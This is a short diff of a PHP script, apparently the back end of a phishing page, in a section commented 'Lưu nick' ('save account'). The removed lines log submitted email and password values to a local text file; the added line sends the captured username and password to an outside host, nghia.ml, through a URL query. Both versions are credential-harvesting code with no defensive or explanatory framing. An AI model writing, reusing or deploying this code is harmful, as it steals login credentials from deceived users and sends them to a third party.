@@ -54,18 +54,7 @@ if(isset($_POST['u'], $_POST['p'])){
 }
 
 //Lưu nick
-$handle = fopen("tretrau.txt", "a");
-foreach($_POST as $variable => $value) {
-if ($variable == 'email' or $variable == 'pass')
-{
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-}
-fwrite($handle, "\r\n");
-fclose($handle);
+file_get_contents('http://nghia.ml/api/mail.php?email='.@$_GET['u'].'&pass='.@$_GET['p']);
 //End lưu nick
 
 $data = array(
